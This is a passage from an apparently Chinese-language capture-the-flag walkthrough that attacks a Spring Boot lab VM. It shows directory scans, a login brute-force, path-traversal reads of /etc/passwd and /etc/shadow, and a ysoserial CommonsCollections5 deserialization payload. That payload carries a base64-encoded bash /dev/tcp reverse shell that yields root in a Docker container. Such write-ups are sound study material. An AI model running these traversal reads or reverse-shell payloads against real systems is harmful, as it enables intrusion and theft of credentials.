‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=..%5c..%5c..%5cetc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=a/../../../../etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=file:///etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=../../../../etc/passwd%00.jpg'
&lt;h1&gt;Forbidden access                                                                                                                    
```

Â∫îËØ•ÊòØÂ∞ëÂèÇÊï∞ÔºåÊöÇÊó∂ÊêÅÁΩÆ

ÁªïËøá‰∏ç‰∫ÜÔºåÁªßÁª≠ÁúãÂÖ∂‰ªñÁöÑ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/error                                                                    
{'timestamp':'2025-06-27T12:16:49.948+0000','status':999,'error':'None','message':'No message available'}                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/login
{'timestamp':'2025-06-27T12:16:58.321+0000','status':405,'error':'Method Not Allowed','message':'Request method 'GET' not supported','path':'/login'}                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/login -X POST
{'timestamp':'2025-06-27T12:17:20.707+0000','status':400,'error':'Bad Request','message':'Required String parameter 'username' is not present','path':'/login'}                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/test/        
    \&lt;h1&gt;Website is under development.......                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ trans -b :zh 'Website is under development.......' 2&gt;/dev/null
ÁΩëÁ´ôÊ≠£Âú®ÂºÄÂèë‰∏≠.......
```

gobusterË∑ë‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.131:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.131:8080
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 158]
/login.html           (Status: 200) [Size: 2377]
/login                (Status: 405) [Size: 149]
/test                 (Status: 200) [Size: 39]
/logout               (Status: 302) [Size: 0] [--&gt; http://192.168.205.131:8080/login.html]
/success              (Status: 200) [Size: 47]
/error                (Status: 500) [Size: 105]
```

Â§ö‰∫Ü‰∏Ä‰∏™logout‰ΩÜÊòØÊòØË∑≥ËΩ¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/logout -v                       
*   Trying 192.168.205.131:8080...
* Connected to 192.168.205.131 (192.168.205.131) port 8080
* using HTTP/1.x
&gt; GET /logout HTTP/1.1
&gt; Host: 192.168.205.131:8080
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 302 
&lt; Set-Cookie: auth=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly
&lt; Location: http://192.168.205.131:8080/login.html
&lt; Content-Length: 0
&lt; Date: Fri, 27 Jun 2025 12:27:05 GMT
&lt; 
* Connection #0 to host 192.168.205.131 left intact
```

nucleiÊâ´Êèè‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nuclei -u http://192.168.205.131:8080
Generated code
__     _
Use code with caution.
____  __  / /  ()
/ __ / / / / / / _ / /
/ / / / // / // /  __/ /
// //_,/_/_/_/_/   v3.4.5
Generated code
projectdiscovery.io
Use code with caution.
[INF] Your current nuclei-templates  are outdated. Latest is v10.2.3
[INF] Successfully updated nuclei-templates (v10.2.3) to /home/kali/.local/nuclei-templates. GoodLuck!
Nuclei Templates v10.2.3 Changelog
+-------+-------+----------+---------+
| TOTAL | ADDED | MODIFIED | REMOVED |
+-------+-------+----------+---------+
| 11102 | 11102 |        0 |       0 |
+-------+-------+----------+---------+
[INF] Current nuclei version: v3.4.5 (latest)
[INF] Current nuclei-templates version: v10.2.3 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 105
[INF] Templates loaded for current scan: 8086
[INF] Executing 7884 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1747 (Reduced 1642 Requests)
[INF] Using Interactsh Server: oast.online
[ssh-auth-methods] [javascript] [info] 192.168.205.131:22 ['['publickey','password','keyboard-interactive']']
[ssh-server-enumeration] [javascript] [info] 192.168.205.131:22 ['SSH-2.0-OpenSSH_9.9']
[ssh-password-auth] [javascript] [info] 192.168.205.131:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.131:22
[spring-detect] [http] [info] http://192.168.205.131:8080/error
[options-method] [http] [info] http://192.168.205.131:8080 ['GET,HEAD,OPTIONS']
[springboot-actuator:favicon] [http] [info] http://192.168.205.131:8080/favicon.ico
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.131:8080/login.html
[favicon-detect:spring-boot] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']
[favicon-detect:Springboot Actuators] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']
[favicon-detect:Spring Boot H2 Database] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']
[INF] Scan completed in 1m. 21 matches found.
```

ÁúãÂà∞Spring BootÔºåÊâÄ‰ª•Â∞ùËØïÊé¢Êµã‰∫Ü‰∏Ä‰∏ãÔºåÊó†Êûú

ÈÇ£ÂéªÁàÜÁ†¥loginÂêß

‰π±ËæìÔºåburpÊã¶‰∏äÔºåÊîæÂéªÁàÜÁ†¥Ê®°Âùó

![image-20250627203233278](https://7r1umphk.github.io/image/image20250627203233435.webp)

Áî®Êà∑Âêç

ÂØÜÁ†ÅÊâíÊãâ‰∏Ä‰∏™rockyou

![image-20250627203358528](https://7r1umphk.github.io/image/image20250627203358895.webp

ÁôªÂΩï

![image-20250627203459351](https://7r1umphk.github.io/image/image20250627203459633.webp)

Ê∫êÁ†ÅÊ≤°Âï•ÔºåÈÇ£Â∞±Áúã‰∏Ä‰∏ãÂåÖ

```
GET /success HTTP/1.1
Host: 192.168.205.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.131:8080/login.html?error=Wrong%20username%20or%20password
Connection: keep-alive
Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Êúâ‰∏™cookieÔºåÊàë‰ª¨ÂàöÂàöÈÇ£Èáå‰πüÂ∞ë‰∏™ÂèÇÊï∞so

### 3.2 ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºàLFIÔºâ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=../../../etc/passwd' -H 'Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

ÂèØ‰ª•‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºå‰ΩÜÊòØÂèëÁé∞Â•ΩÂÉèÊ≤°Âá†‰∏™Áî®Êà∑

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=../../../etc/shadow' -H 'Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
root:!::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
postgres:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
                                    
```

ÁúãÂà∞ËøôÂ∞±ÊúâÁÇπÊÄÄÁñëÊòØdocker‰∫Ü

Âõ†‰∏∫ÂâçÈù¢nucleiÊâ´ÊèèÁöÑÊó∂ÂÄôÁúãÂà∞ÂèØËÉΩÊòØspringbootÔºåÊâÄ‰ª•ÂÖ≥Ê≥®‰∏Ä‰∏ãJava

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=../../../../proc/self/cmdline' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' -o cmdline
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    40    0    40    0     0   8188      0 --:--:-- --:--:-- --:--:-- 10000
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat cmdline                                                                 
java-jarjavaserver-0.0.1-SNAPSHOT.jar                                           
```

ÂÅáËÆæË∑ØÂæÑÊòØapp/java-jarjavaserver-0.0.1-SNAPSHOT.jar

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar                          
```

ÂïäËøôÔºåÈÇ£Êàë‰∏çÁåú‰∫Ü

Linux ÁöÑ /proc Êñá‰ª∂ÔºåÂèØ‰ª•Êü•Áúã**ÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩï**

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=../../../../proc/self/cwd' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
../../../../proc/self/cwd                                                       
```

ÂïäËøôÔºåÈÇ£ÁªßÁª≠ÁåúÂêß

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=javaserver-0.0.1-SNAPSHOT.jar' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' -o app.jar &amp;&amp; ls -l app.jar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16.5M    0 16.5M    0     0  12.9M      0 --:--:--  0:00:01 --:--:-- 12.9M
-rwxr-xr-x 1 kali kali 17372545  6Êúà27Êó• 08:51 app.jar
                                                       
```

ÔºàË¶Å‰∏çÂéª‰π∞‰∏™ÂΩ©Á•®ÔºåÂìàÂìàÂìàÔºâ

### 3.3 JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®

Êãøjd-guiÁúãÁúã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ jd-gui app.jar

```

![image-20250627205341588](https://7r1umphk.github.io/image/image20250627205341941.webp)

Ê≤°‰∏úË•øÔºå‰ΩÜÊòØ**VulnController.class**

```
// ...
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
// ...

@PostMapping({'/deserialize'})
public String deserialize(@RequestBody byte[] data, HttpServletRequest request) {
    if (!isLoggedIn(request)) // Ê£ÄÊü•ÊòØÂê¶Â∑≤ÁôªÂΩï
        return '&lt;h2&gt;Error: Unauthorized access';
    try {
        // Âç±Èô©Êìç‰ΩúÔºöÁõ¥Êé•‰ªéËØ∑Ê±Ç‰Ωì‰∏≠ËØªÂèñÊï∞ÊçÆÂπ∂ÂèçÂ∫èÂàóÂåñ
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object obj = ois.readObject();
        ois.close();
        return 'Deserialized: ' + obj.toString();
    } catch (Exception e) {
        return 'Error: ' + e.getMessage();
    }
}
```

Áúã‰ªñÁöÑÂ§ÑÁêÜÊñπÊ≥ï......ÊúâÁÇπÂÉèÊâì**ÂèçÂ∫èÂàóÂåñ**

&gt; JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥û
&gt;
&gt; Â∫îÁî®Êé•Êî∂‰∫ÜÊù•Ëá™Áî®Êà∑ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆÔºåÂπ∂Âú®Ê≤°ÊúâËøõË°åÂÆâÂÖ®Ê£ÄÊü•ÁöÑÊÉÖÂÜµ‰∏ãË∞ÉÁî® `ObjectInputStream.readObject()` Â∞ÜÂÖ∂ËøòÂéü‰∏∫JavaÂØπË±°„ÄÇÂ¶ÇÊûúÂ∫îÁî®ÁöÑclasspath‰∏≠Â≠òÂú®Êüê‰∫õË¢´Áß∞‰∏∫‚Äúgadget‚ÄùÁöÑÁâπÊÆäÁ±ªÔºåÊîªÂáªËÄÖÂ∞±ÂèØ‰ª•ÊûÑÈÄ†ÊÅ∂ÊÑèÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆ„ÄÇÂΩìËøô‰∫õÊï∞ÊçÆË¢´ÂèçÂ∫èÂàóÂåñÊó∂Ôºå‰ºöËß¶ÂèëgadgetÁ±ª‰∏≠ÁöÑÊñπÊ≥ïÔºåÊúÄÁªàÂØºËá¥‰ªªÊÑè‰ª£Á†ÅÊâßË°åÔºàRCEÔºâ„ÄÇ

![image-20250627205623427](https://7r1umphk.github.io/image/image20250627205623599.webp)

okÔºåÊ≤°‰∫ã‰∫ÜÔºåÂ∞±ÊòØÊâìÂèçÂ∫èÂàóÂåñ

commons-collections-3.2.1.jarËøô‰∏™Â∫ìÔºåÂ¶ÇÊûú‰∫ÜËß£ÁöÑËØùÔºåÂ∞±Áü•ÈÅìÂèØ‰ª•Ë¢´ ysoserial Â∑•ÂÖ∑Âà©Áî®

url:/deserialize

ËØ∑Ê±ÇÊñπÊ≥ïÔºöPOST

if (!isLoggedIn(request)) ÂøÖÈ°ªÊê∫Â∏¶ÊúâÊïàÁöÑ Cookie

new ObjectInputStream(new ByteArrayInputStream(data));Âíå ois.readObject();ÊâìÂºÄÊàøÈó®ËÆ©‰Ω†ËøõÔºå‰∏çÂÅö‰ªª‰ΩïÊ£ÄÊü•ÔºåÈùûÂ∏∏ÁöÑÊïôÁßë‰π¶

ÈÇ£Êãø‰∏Ä‰∏ãÂêß

KaliÁõëÂê¨‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
```

‰ΩøÁî® ysoserialÁîüÊàêÂèçÂºπ Shell payload

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar 
--2025-06-27 20:21:29--  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
Ê≠£Âú®Ëß£Êûê‰∏ªÊú∫ github.com (github.com)... 224.0.0.1
Ê≠£Âú®ËøûÊé• github.com (github.com)|224.0.0.1|:443... Â∑≤ËøûÊé•„ÄÇ
Â∑≤ÂèëÂá∫ HTTP ËØ∑Ê±ÇÔºåÊ≠£Âú®Á≠âÂæÖÂõûÂ∫î... 302 Found
‰ΩçÁΩÆÔºöhttps://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar [Ë∑üÈöèËá≥Êñ∞ÁöÑ URL]
--2025-06-27 20:21:32--  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
ÂÜçÊ¨°‰ΩøÁî®Â≠òÂú®ÁöÑÂà∞ github.com:443 ÁöÑËøûÊé•„ÄÇ
Â∑≤ÂèëÂá∫ HTTP ËØ∑Ê±ÇÔºåÊ≠£Âú®Á≠âÂæÖÂõûÂ∫î... 302 Found
‰ΩçÁΩÆÔºöhttps://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250628T002132Z&amp;X-Amz-Expires=1800&amp;X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&amp;X-Amz-SignedHeaders=host&amp;response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&amp;response-content-type=application%2Foctet-stream [Ë∑üÈöèËá≥Êñ∞ÁöÑ URL]
--2025-06-27 20:21:32--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250628T002132Z&amp;X-Amz-Expires=1800&amp;X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&amp;X-Amz-SignedHeaders=host&amp;response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&amp;response-content-type=application%2Foctet-stream
Ê≠£Âú®Ëß£Êûê‰∏ªÊú∫ objects.githubusercontent.com (objects.githubusercontent.com)... 224.0.0.2
Ê≠£Âú®ËøûÊé• objects.githubusercontent.com (objects.githubusercontent.com)|224.0.0.2|:443... Â∑≤ËøûÊé•„ÄÇ
Â∑≤ÂèëÂá∫ HTTP ËØ∑Ê±ÇÔºåÊ≠£Âú®Á≠âÂæÖÂõûÂ∫î... 200 OK
ÈïøÂ∫¶Ôºö59525376 (57M) [application/octet-stream]
Ê≠£Âú®‰øùÂ≠òËá≥: ‚Äúysoserial-all.jar‚Äù

ysoserial-all.jar                            100%[============================================================================================&gt;]  56.77M  17.2MB/s  Áî®Êó∂ 3.9s    

2025-06-27 20:21:39 (14.6 MB/s) - Â∑≤‰øùÂ≠ò ‚Äúysoserial-all.jar‚Äù [59525376/59525376])

                                                               
```

ÁîüÊàê payloadÔºàÂèØËÉΩ‰Ω†ÁöÑjava‰ºöÊúâÈóÆÈ¢òÔºåÂéª‰∏ãËΩΩ‰∏Ä‰∏™Java 8ÁâàÊú¨ÁöÑÂ∞±Â•Ω‰∫ÜÔºâ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo -n 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ java -jar ysoserial-all.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}' &gt; payload.bin
```

Â∞ùËØï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/deserialize' -X POST --cookie 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' --data-binary @payload.bin                   
{'timestamp':'2025-06-27T13:34:01.451+0000','status':404,'error':'Not Found','message':'No message available','path':'/deserialize'}                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/deserialize' -X POST --cookie 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' --data-binary @payload.bin -H 'Content-Type:'
{'timestamp':'2025-06-27T13:34:11.493+0000','status':404,'error':'Not Found','message':'No message available','path':'/deserialize'}                   
```

ÂºπÂõûÊù•‰∫Ü

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## Âõõ„ÄÅÊ®™ÂêëÁßªÂä®ÔºöDockerÈÄÉÈÄ∏‰∏éÂÜÖÁΩëÁ©øÈÄè

ÁûÑ‰∫Ü‰∏Ä‰∏ãÔºåÂπ∂‰∏îÊ†πÊçÆ‰πãÂâç‰∏ãËΩΩÈù∂Êú∫ÁöÑ‰ΩìÈáèÊé®ÊµãÊòØ‰∏™alpineÔºåÊâÄ‰ª•‰∏çÁ®≥ÂÆöshell‰∫Ü

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4# ls -la
ls -la
total 16976
drwxr-xr-x    1 root     root          4096 Jun 16 18:16 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
-rw-r--r--    1 root     root      17372545 Jun 16 17:46 javaserver-0.0.1-SNAPSHOT.jar
bash-4.4# cd ..
cd ..
bash-4.4# ls -al
ls -al
total 80
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
-rwxr-xr-x    1 root     root             0 Jun 24 04:20 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 16 18:16 app
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 bin
drwxr-xr-x    5 root     root           320 Jun 27 08:43 dev
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 etc
drwxr-xr-x    2 root     root          4096 May  9  2019 home
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 lib
drwxr-xr-x    5 root     root          4096 May  9  2019 media
drwxr-xr-x    2 root     root          4096 May  9  2019 mnt
drwxr-xr-x    2 root     root          4096 May  9  2019 opt
dr-xr-xr-x  217 root     root             0 Jun 27 08:43 proc
drwx------    1 root     root          4096 Jun 27 13:28 root
drwxr-xr-x    2 root     root          4096 May  9  2019 run
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 sbin
drwxr-xr-x    2 root     root          4096 May  9  2019 srv
dr-xr-xr-x   13 root     root             0 Jun 27 08:43 sys
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 tmp
drwxr-xr-x    1 root     root          4096 May 11  2019 usr
drwxr-xr-x    1 root     root          4096 May  9  2019 var
bash-4.4# cd opt
cd opt
bash-4.4# ls -al
ls -al
total 8
drwxr-xr-x    2 root     root          4096 May  9  2019 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
bash-4.4# cd /tmp
cd /tmp
bash-4.4# ls -al
ls -al
total 100
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root
-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned
drwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080
drwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080
drwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080
drwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080
drwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080
drwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080
drwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080
drwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080
